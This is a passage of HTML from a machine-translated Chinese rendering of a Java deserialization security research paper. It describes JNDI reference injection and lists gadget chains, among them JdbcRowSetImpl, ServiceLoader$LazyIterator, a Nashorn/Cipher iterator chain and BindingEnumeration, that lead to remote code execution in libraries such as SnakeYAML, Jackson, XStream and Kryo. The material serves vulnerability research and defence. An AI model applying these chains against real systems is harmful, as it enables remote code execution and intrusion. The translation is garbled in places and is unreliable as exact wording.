<div style="position:absolute;top:20562;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JNDI 使用多种机制提供对存储在目录中的对象的访问。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:20580;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些机制中至少有两个，即 RMI 和 LDAP，允许本地 Java 对象</font></font></nobr></div>
<div style="position:absolute;top:20597;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过目录访问，这些是使用 Java 序列化存储/传输的。</font></font></nobr></div>
<div style="position:absolute;top:20615;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两种机制都允许这些对象提供它们的类所依据的代码库</font></font></nobr></div>
<div style="position:absolute;top:20633;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该加载。</font><font style="vertical-align: inherit;">然而，出于明显的安全原因，这些机制并没有</font></font></nobr></div>
<div style="position:absolute;top:20651;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下启用了很长一段时间。</font></font></nobr></div>
<div style="position:absolute;top:20674;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是 JNDI 也有一个引用机制，允许 JNDI 存储的对象表明</font></font></nobr></div>
<div style="position:absolute;top:20692;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它应该从其他目录位置加载。</font><font style="vertical-align: inherit;">这些参考可以</font></font></nobr></div>
<div style="position:absolute;top:20710;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还指定用于实例化/检索它们的 javax.naming.spi.ObjectFactory。</font></font></nobr></div>
<div style="position:absolute;top:20727;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们确实允许指定用于加载工厂类的代码库，以及</font></font></nobr></div>
<div style="position:absolute;top:20745;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原因，对此没有任何限制。</font><font style="vertical-align: inherit;">利用这种机制的攻击</font></font></nobr></div>
<div style="position:absolute;top:20763;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已针对 RMI </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 LDAP 发布。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Java 8u121 终于添加了那个代码库</font></font></nobr></div>
<div style="position:absolute;top:20781;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">限制，但目前仅适用于 RMI。</font></font></nobr></div>
<div style="position:absolute;top:20804;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用攻击者提供</font><font style="vertical-align: inherit;">的调用 javax.naming.InitialContext-&gt;lookup() </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:20822;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name 参数将导致连接到攻击者控制的服务器。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:20840;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后服务器可以返回一个引用</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41，</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定一个对象工厂和一个攻击者——</font></font></nobr></div>
<div style="position:absolute;top:20857;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受控 URL 作为代码库。</font></font></nobr></div>
<div style="position:absolute;top:20880;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后默认的 JNDI 实现将继续，构造一个 URLClassLoader</font></font></nobr></div>
<div style="position:absolute;top:20898;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用提供的代码库并通过以下方式加载/初始化指定的对象工厂类</font></font></nobr></div>
<div style="position:absolute;top:20916;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">it </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> – 执行攻击者提供的代码。</font></font></nobr></div>
<div style="position:absolute;top:20938;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该注意的是，可以覆盖对象工厂行为</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且</font></font></nobr></div>
<div style="position:absolute;top:20956;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至少 Wildfly/JBoss 这样做的实现没有实现</font></font></nobr></div>
<div style="position:absolute;top:20974;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象工厂的远程代码库加载。</font><font style="vertical-align: inherit;">不过还是可以触发</font></font></nobr></div>
<div style="position:absolute;top:20992;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 通过此向量对攻击者提供的数据进行反序列化。</font></font></nobr></div>
<div style="position:absolute;top:21014;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 javax.naming.Context 实例也是攻击者控制的并且是 javax.naming。</font></font></nobr></div>
<div style="position:absolute;top:21034;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">spi.ContinuationContext可以恢复，网络间接可以完全</font></font></nobr></div>
<div style="position:absolute;top:21050;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">省略，因为 ContinuationContext 的方法通过 getTargetContext() 将触发-</font></font></nobr></div>
<div style="position:absolute;top:21068;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ger 取消引用提供的参考，</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#20"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含一些细节。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:21233;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://zerothoughts </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微博</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/post/137769010389/fun-with-jndi-remote-code-injection</font></font></a></font></nobr></div>
<div style="position:absolute;top:21247;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">黑帽子</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:21265;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作到 RCE </font></font></a><i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></i><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pdf</font></font></a></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:21276;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能还有其他人，但这些似乎更不常见</font></font></font></nobr></div>
<div style="position:absolute;top:21290;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者更确切地说 com.sun.jndi.rmi.registry.ReferenceWrapper 在 RMI 案例中</font></font></font></nobr></div>
<div style="position:absolute;top:21304;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关代码可在javax.naming.spi.NamingManager-&gt;getObjectInstance()中找到</font></font></font></nobr></div>
<div style="position:absolute;top:21318;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">见 javax.naming.spi.NamingManager-&gt;setObjectFactoryBuilder()</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:21381;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21629;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:21789;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2 com.sun.rowset.JdbcRowSetImpl</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:21827;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:21861;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> jYAML (3.1.2) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#7"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Red5 (3.1.5) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jackson (3.1.6)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#9"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:21901;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">实现 java.io.Serializable，有</font></font></nobr></div>
<div style="position:absolute;top:21919;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认构造函数，使用的属性也有 getter。</font><font style="vertical-align: inherit;">两个正确订购</font></font></nobr></div>
<div style="position:absolute;top:21937;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码执行需要 setter 调用。</font></font></nobr></div>
<div style="position:absolute;top:21961;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 将“dataSourceName”属性设置为 JNDI URI（参见</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#17"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
<div style="position:absolute;top:21983;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 设置“自动提交”属性。</font></font></nobr></div>
<div style="position:absolute;top:22005;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 这将导致调用connect()。</font></font></nobr></div>
<div style="position:absolute;top:22026;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用提供的 JNDI URI 调用 InitialContext-&gt;lookup()。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:22069;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3 java.util.ServiceLoader$LazyIterator</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:22107;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:22142;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:22182;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是 java.io.Serializable，不是</font></font></nobr></div>
<div style="position:absolute;top:22200;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个默认构造函数，没有 bean setter。</font><font style="vertical-align: inherit;">需要支持内部类实例</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46</font></font></font></nobr></div>
<div style="position:absolute;top:22218;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及恢复 URLClassLoader 的能力。</font></font></nobr></div>
<div style="position:absolute;top:22242;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个带有 URLClassLoader 实例的 LazyIterator。</font></font></nobr></div>
<div style="position:absolute;top:22263;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.调用Iterator-&gt;next()加载远程服务定义并实例化</font></font></nobr></div>
<div style="position:absolute;top:22281;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程代码库中的指定类。</font></font></nobr></div>
<div style="position:absolute;top:22305;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据情况可能有不同的机会触发</font></font></nobr></div>
<div style="position:absolute;top:22325;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迭代器-&gt;next() 调用：</font></font></nobr></div>
<div style="position:absolute;top:22344;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•使用java.util.ServiceLoader适应迭代器为可迭代</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:22363;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到一个类</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它通过一个可达调用触发该 Iterable 的迭代。</font></font></nobr></div>
<div style="position:absolute;top:22384;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">• 创建一个模拟代理，为某些集合类型的迭代返回迭代器</font></font></nobr></div>
<div style="position:absolute;top:22403;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例行公事。</font><font style="vertical-align: inherit;">这些触发器很常见。</font><font style="vertical-align: inherit;">直到并包括 Java 8u71，</font></font></nobr></div>
<div style="position:absolute;top:22420;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准库 AnnotationInvocationHandler 可用于构造</font></font></nobr></div>
<div style="position:absolute;top:22438;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提到了模拟代理，使其成为标准库小工具。</font><font style="vertical-align: inherit;">对于以后的版本</font></font></nobr></div>
<div style="position:absolute;top:22456;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，Google Guice </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或 Hibernate Validator 中</font><font style="vertical-align: inherit;">存在替代方案</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:22481;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不可靠，仅适用于 Jackson &gt;= 2.7.0</font></font></font></nobr></div>
<div style="position:absolute;top:22495;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准库中甚至有几个副本，其他库中更多</font></font></font></nobr></div>
<div style="position:absolute;top:22509;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些替代方案，包括 sun.misc.Service$LazyIterator 不</font></font></font></nobr></div>
<div style="position:absolute;top:22524;left:168"><nobr><font style="vertical-align: inherit;"><font style="font-size:9px"><font style="vertical-align: inherit;">其他</font></font><font style="vertical-align: inherit;">47</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">人也可以申请</font></font></font></nobr></div>
<div style="position:absolute;top:22538;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准库中似乎没有一个类甚至具有 Iterable 字段，</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22554;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但这些确实存在，例如 hudson.util.RunList。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:22566;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com.google.inject.internal.Annotations-&gt;generateAnnotationImpl() 的匿名类</font></font></font></nobr></div>
<div style="position:absolute;top:22580;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">org.hibernate.validator.util.annotationfactory.AnnotationProxy</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:22643;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:23054;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果解组器能够恢复所有组件，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">甚至有一个标准</font></font></nobr></div>
<div style="position:absolute;top:23071;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致直接迭代器取消引用而不使用任何库的仅库链</font></font></nobr></div>
<div style="position:absolute;top:23089;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理：</font></font></nobr></div>
<div style="position:absolute;top:23115;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. jdk.nashorn.internal.objects.NativeString 上的 hashCode() 触发 Native</font></font></nobr></div>
<div style="position:absolute;top:23134;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串-&gt;getStringValue()。</font></font></nobr></div>
<div style="position:absolute;top:23155;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. getStringValue() 调用 java.lang.CharSequence-&gt;toString()。</font></font></nobr></div>
<div style="position:absolute;top:23178;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. com.sun.xml.internal.bind.v2.runtime.unmarshaller的toString()。</font></font></nobr></div>
<div style="position:absolute;top:23197;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Base64Data 调用 Base64Data-&gt;get()。</font></font></nobr></div>
<div style="position:absolute;top:23218;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. Base64Data-&gt;get() 从提供的 java.io.InputStream 触发 read()</font></font></nobr></div>
<div style="position:absolute;top:23236;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javax.activation.DataSource, com.sun.xml.internal.ws.encoding.xml。</font></font></nobr></div>
<div style="position:absolute;top:23255;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XMLMessage$XmlDataSource 是一种提供预先存在的</font></font></nobr></div>
<div style="position:absolute;top:23272;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一。</font></font></nobr></div>
<div style="position:absolute;top:23294;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. javax.crypto.CipherInputStream 上的 read()s 最终调用 javax.crypto。</font></font></nobr></div>
<div style="position:absolute;top:23313;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码-&gt;更新（）。</font></font></nobr></div>
<div style="position:absolute;top:23334;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. javax.crypto.Cipher-&gt;update() 导致chooseFirstProvider() 触发-</font></font></nobr></div>
<div style="position:absolute;top:23352;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gers 任意提供的迭代器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:23397;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4 com.sun.jndi.rmi.registry.BindingEnumeration</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:23435;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:23470;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:23511;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">不是 java.io.Serializable，不是</font></font></nobr></div>
<div style="position:absolute;top:23529;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个默认构造函数，没有 bean setter。</font><font style="vertical-align: inherit;">仅限于 JNDI/RMI 查找，因此</font></font></nobr></div>
<div style="position:absolute;top:23547;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不再可用于从 u121 开始的直接代码执行。</font></font></nobr></div>
